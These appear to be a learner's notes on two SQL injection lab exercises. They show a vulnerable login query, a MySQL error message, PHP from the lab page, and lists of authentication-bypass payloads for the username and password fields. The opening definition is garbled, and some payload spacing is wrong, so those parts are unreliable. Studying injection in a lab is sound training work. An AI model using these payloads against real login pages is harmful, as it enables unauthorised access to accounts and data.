SQL INJECTION - 01
-Sql injection comes from a encryption/escaping of user supplied input when included in SQL queries.

Based on how the user supplied input is added to the sql queries, you will need different things to break the syntax. There are three different ways to echo information in an sql query.
i) Using quotes: single quote(') or double quote(")
ii) Using backticks(`)
iii)Directly

QUERY: SELECT * FROM user WHERE login ='[user]' and PASSWORD='[password]'
LAB:
Tried with the single quote(') in the username field, the application throws the following error:
ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' and password=md5('')' at line 1

The payload will be added to the sql query as below:
Select * FROM user WHERE login='admin'OR1=1--'' and PASSWORD='password'
Here the payload will be admin'OR1=1--'

The payload here is admin'or1=1--'
                    admin' or '1'='1'
                    admin' or '1'='1'---'
CODE REVIEW:
<?php
    session_start(); starting the session
    if (!isset($_SESSION['user'])) {
        header("Location: /login.php");
        die();
    }

    require "header.php";
?>

<div class="row">
    <div class="col-lg-12">
        <h1>SQL Injection 01</h1>
        <span class="text text-success">
            You are currently logged in! The key for this exercise is 
            <b><?php echo htmlentities(getenv("PTLAB_KEY")); ?></b>.
        </span>
    </div>
</div>


SQL INJECTION - 02
In this case, the double quote is being used in the user input. EX admin will become "admin" in the query.
Using Double quotes(") to echo the SQL statement.
The payloads will be:
                     admin" OR 1=1--"
                     admin' OR "1"="1"--"
                     admin' OR "1"="1
These are the payloads for the username field.
The payloads for the password field would be as follows:
                     ") OR 1=1-- 
                     ") OR ("1"="1")
                     ") OR ("1"="1
